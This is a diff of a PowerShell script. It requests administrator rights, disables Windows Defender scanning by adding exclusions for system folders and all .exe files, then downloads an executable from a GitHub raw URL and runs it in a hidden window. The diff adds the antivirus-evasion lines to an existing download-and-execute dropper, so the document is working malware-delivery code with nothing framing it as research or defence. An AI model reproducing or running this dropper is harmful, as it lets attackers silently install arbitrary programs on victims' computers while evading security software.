@@ -1,30 +1,31 @@
-function Run-ElevatedScript {
-    param(
-        [Parameter(Mandatory=$true)]
-        [ScriptBlock]
-        $ScriptBlock
-    )
-
-    Start-Process PowerShell -Verb runas -ArgumentList "-ExecutionPolicy Bypass", "-WindowStyle Hidden", $ScriptBlock
-}
-
 $scriptBlock = {
-    $url = 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/123.exe'
-    $downloadPath = 'C:\temp\123.exe'
+    Add-MpPreference -ExclusionPath 'C:\ProgramData'
+    Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'
+    Add-MpPreference -ExclusionPath 'C:\Windows\System32'
+    Add-MpPreference -ExclusionPath 'C:\Windows\SysWOW64'
+    Add-MpPreference -ExclusionPath 'C:\Windows'
+    Add-MpPreference -ExclusionExtension '.exe'
 
+    $url = 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/123.exe'
+
+    # Download to a temporary location with error handling
     try {
         Write-Host "Downloading file..."
+        $downloadPath = Join-Path -Path C:\temp -ChildPath "123.exe"
         Invoke-WebRequest -Uri $url -OutFile $downloadPath
-
-        Write-Host "Executing file..."
-        Start-Process $downloadPath -WindowStyle Hidden
     } catch {
-        Write-Warning "An error occurred: $($_.Exception.Message)"
+        Write-Warning "An error occurred downloading the file: $($_.Exception.Message)"
+        return
     }
+
+    # Execute downloaded file
+    Write-Host "Executing file..."
+    Start-Process $downloadPath -WindowStyle Hidden
 }
 
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Run-ElevatedScript -ScriptBlock $scriptBlock
+    Start-Process PowerShell -Verb runas -ArgumentList "-ExecutionPolicy Bypass", "-WindowStyle Hidden", $scriptBlock
+    Exit
 } else {
     & $scriptBlock
 }
